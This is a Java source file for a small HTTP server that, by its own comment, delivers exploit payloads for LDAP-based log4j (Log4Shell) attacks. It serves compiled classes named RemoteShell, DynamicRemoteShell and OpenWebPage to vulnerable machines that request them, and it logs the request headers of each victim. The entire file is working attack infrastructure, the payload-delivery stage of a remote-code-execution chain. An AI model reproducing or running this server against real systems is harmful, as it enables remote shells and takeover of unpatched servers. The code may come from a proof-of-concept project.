import com.sun.net.httpserver.Headers;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import java.io.*;
import java.net.InetSocketAddress;
import java.util.Arrays;
import java.util.List;
import java.util.logging.Logger;

import static java.util.Optional.ofNullable;
import static java.util.logging.Level.INFO;
import static java.util.logging.Level.WARNING;

/**
 * Very simple HTTP server for delivering exploits for LDAP based log4j attacks.
 */
public class ExploitServer {

    private static final Logger LOGGER = Logger.getLogger("ExploitServer");

    private static final List<String> ENABLED_EXPLOITS = Arrays.asList("/OpenWebPage.class", "/RemoteShell.class", "/DynamicRemoteShell.class");
    private static final String CONTEXT_PATH = "/";

    private final HttpServer httpServer;

    public ExploitServer(InetSocketAddress listeningAddress) throws IOException {
        httpServer = HttpServer.create(listeningAddress, 0);
        httpServer.createContext(CONTEXT_PATH, ExploitServer::handle);
    }

    public void start() {
        LOGGER.log(INFO, "Staring exploit server.");

        httpServer.start();

        LOGGER.log(INFO, "Enabled exploits: {0}", ENABLED_EXPLOITS);
        LOGGER.log(INFO, "Staring exploit server listening on {0}:{1,number,#####}{2}", new Object[]{httpServer.getAddress().getHostName(), httpServer.getAddress().getPort(), CONTEXT_PATH});
    }

    public void stop() {
        LOGGER.log(INFO, "Stopping exploit server.");
        httpServer.stop(10);
    }

    /**
     * Will handle a http request and if it is a request for one of the accepted exploits, the
     * payload will be returned as a byte array.
     *
     * @param exchange incoming request.
     */
    private static void handle(HttpExchange exchange) {
        try {
            final String path = exchange.getRequestURI().getPath();

            logRequestInfo(exchange);

            if (ENABLED_EXPLOITS.contains(path)) {
                byte[] exploitPayload = toByteArray(path);
                exchange.sendResponseHeaders(200, exploitPayload.length);
                final OutputStream responseBody = exchange.getResponseBody();
                responseBody.write(exploitPayload);
                responseBody.close();
                LOGGER.log(INFO, "Served exploit {0}", path);
            } else {
                LOGGER.log(INFO, "Bad request, unable to provide exploit.");
                exchange.sendResponseHeaders(400, 0);
            }
            exchange.close();
        } catch (Exception e) {
            LOGGER.log(WARNING, "Unable to handle request.", e);
        }
    }

    private static void logRequestInfo(HttpExchange exchange) {
        LOGGER.log(INFO, "> New request: {0}", exchange.getRemoteAddress());
        Headers requestHeaders = exchange.getRequestHeaders();
        requestHeaders.forEach((key, value) -> LOGGER.log(INFO, "> Request header: {0}={1}", new Object[]{key, value}));
    }

    /**
     * Will attempt to read a class and return it as a byte array.
     *
     * @param className Class to load.
     * @return Loaded class as bytes.
     * @throws IOException If the class could not be loaded
     */
    private static byte[] toByteArray(final String className) throws IOException {
        try (InputStream source = ofNullable(ExploitServerApp.class.getResourceAsStream(className)).orElseThrow(IOException::new)) {
            final byte[] exploit = new byte[source.available()];
            new DataInputStream(source).readFully(exploit);
            return exploit;
        }
    }

}
